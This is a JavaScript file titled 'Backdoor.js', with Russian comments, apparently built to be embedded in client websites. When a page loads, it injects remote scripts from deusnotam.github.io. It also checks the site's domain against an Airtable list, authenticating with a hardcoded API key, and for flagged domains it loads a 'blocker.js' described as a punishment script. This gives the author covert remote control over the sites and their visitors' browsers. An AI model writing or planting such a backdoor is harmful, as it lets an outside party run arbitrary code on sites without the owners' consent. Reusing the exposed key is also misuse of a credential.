/*!
 * Backdoor.js v1.0.3a
 * (c) 2024-2024
 * by Deus Notam
 * Telegram → https://t.me/d3usn0tam
 */

if (!window.D3usN0tam) {
  
  console.log("D3usN0tam System - Connected!\n\nMade by D3us N0tam\nNotion Site → https://deusnotam.notion.site/D3usN0tam-System-ba149f69de214fd3ba0b9df834eb2c6e?pvs=4\nTelegram → https://t.me/d3usn0tam");

  // Подключение activator.js - скрипт проверки подключения
  var activatorScript = document.createElement('script');
  activatorScript.src = 'https://deusnotam.github.io/activator.js';
  document.head.appendChild(activatorScript);
  
    // Получите API-ключ и идентификатор базы данных из настроек Airtable
    var airtableApiKey = 'patuoL9R4t4wpFWXS';
    var airtableBaseId = 'appyM5LkcacbXYVGh';

    // URL для запроса данных из Airtable
    var airtableUrl = `https://api.airtable.com/v0/${airtableBaseId}/SiteMap`;

    // Заголовки запроса с использованием API-ключа Airtable
    var headers = new Headers({
      'Authorization': 'Bearer ' + airtableApiKey,
    });

    // Выполнение запроса к Airtable API
    fetch(airtableUrl, { headers: headers })
      .then(response => response.json())
      .then(data => {
        const D3usNotamBD = data.records.map(record => ({
          url: record.fields.url,
          blocker: record.fields.blocker,
          noti: record.fields.noti,
        }));

        function checkDomain() {
          const currentDomain = window.location.hostname;

          // Проверка, есть ли текущий домен в списке
          const DeusSiteInfo = D3usNotamBD.find(site => {
            const siteHostname = new URL(site.url).hostname;
            return currentDomain === siteHostname || currentDomain === "www." + siteHostname || "www." + currentDomain === siteHostname;
          });

          if (!DeusSiteInfo) {
            // Обработка случая, когда домен не найден в списке
            console.log("Сайт не найден в списке системы D3usN0tam.\nThe site was not found in the D3usN0tam system list.");
          } else {
            // Проверка, если blocker у домена равен "active"
            if (DeusSiteInfo.blocker === "active") {
              // Подключение blocker.js - скрипт наказаний
              var blockerScript = document.createElement('script');
              blockerScript.src = 'https://deusnotam.github.io/system/blocker.js';
              document.head.appendChild(blockerScript);
            }
            // Проверка, если noti у домена равен "active"
            if (DeusSiteInfo.noti === "active") {
              // Подключение noti.js - скрипт уведомлений
              var deusidScript = document.createElement('script');
              deusidScript.src = 'https://deusnotam.github.io/system/noti.js';
              document.head.appendChild(deusidScript);
            }
          }
        }

        // Вызов функции для проверки домена
        checkDomain();
      })
      .catch(error => console.error('Error fetching data from Airtable:', error));
  
  // Устанавливаем флаг, что файл подключен
  window.D3usN0tam = true;
}
